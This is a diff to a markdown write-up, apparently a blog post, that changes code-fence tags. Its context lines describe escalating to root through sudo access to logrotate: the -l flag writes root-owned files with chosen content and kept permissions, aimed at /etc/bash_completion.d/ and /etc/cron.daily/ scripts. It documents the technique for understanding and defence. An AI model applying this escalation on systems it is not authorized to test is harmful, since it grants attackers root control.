@@ -20,7 +20,7 @@ So we need to find some functionality __built into logrotate__ which will let us
 ---
 
 Let's first look at logrotate's help text:
-```bash
+```console?prompt=$,#
 $ logrotate --help
 Usage: logrotate [OPTION...] <configfile>
 [..]
@@ -45,7 +45,7 @@ A logrotate configuration file may specify an email address to send log files wh
 ```
 
 However, no logrotate configuration files were mailing logs:
-```bash
+```console?prompt=$,#
 $ grep -nrI 'mail' /etc/logrotate.*
 $
 ```
@@ -53,7 +53,7 @@ $
 ---
 
 So, why not just create a new configuration? No dice:
-```bash
+```console?prompt=$,#
 $ sudo logrotate -m '/usr/bin/uname' ./mail
 Potentially dangerous mode on ./mail: 0664
 error: Ignoring ./mail because it is writable by group or others.
@@ -75,12 +75,12 @@ but I couldn't find anything that would let me log to the file verbatim, or with
 ---
 
 I then thought _/var/mail/root_:
-```bash
+```console?prompt=$,#
 $ ls -l /var/mail/root
 -rw------- 1 root mail 1 Oct  1 01:07 /var/mail/root
 ```
 It definitely fits our requirements. So let's try:
-```bash
+```console?prompt=$,#
 $ cat <<< "/home/user/log.log {
 mail address@example.com
 }" | mail -s "Email Subject" root
@@ -113,7 +113,7 @@ So, out of luck here, too.
 ---
 
 I moved on to the `-s` flag that logrotate provides, and while it can create files as root (and overwrite those that exist), it didn't provide much value:
-```bash
+```console?prompt=$,#
 $ ls -l /tmp/test
 -rw-r----- 1 root root 29 Oct  1 01:19 /tmp/test
 
@@ -124,7 +124,7 @@ logrotate state -- version 2
 ---
 
 Finally, I took a look at the `-l` flag:
-```bash
+```console?prompt=$,#
 $ sudo logrotate -l ./nonexist test
 error: cannot stat test: No such file or directory
 
@@ -141,7 +141,7 @@ $ ls -l nonexist
 -rw-r--r-- 1 root root 952 Oct  1 01:28 nonexist
 ```
 So we can write arbitrary data (**test** here is the arbitrary data, albeit with some garbage between it) to an arbitrary file which is owned by root. What more can we do with this?
-```bash
+```console?prompt=$,#
 user@server:/etc/bash_completion.d$ ls -l
 total 4
 -rw-r--r-- 1 root root 439 Feb 28  2023 git-prompt
@@ -176,7 +176,7 @@ Basically, we can create an arbitrary file in `/etc/bash_completion.d/` which, i
 ---
 
 I wasn't happy with leaving it like this, so I took a further look. As it turns out, the permissions of the log files are retained too:
-```bash
+```console?prompt=$,#
 $ touch check-perms
 $ chmod 777 check-perms
 $ sudo logrotate -l ./check-perms test
@@ -188,7 +188,7 @@ $ ls -l check-perms
 What can we do with this?
 
 Well, we can edit one of the scripts in _/etc/cron.daily/_:
-```bash
+```console?prompt=$,#
 user@server:/etc/cron.daily$ ls -l man-db
 -rwxr-xr-x 1 root root 1395 Mar 12  2023 man-db
 
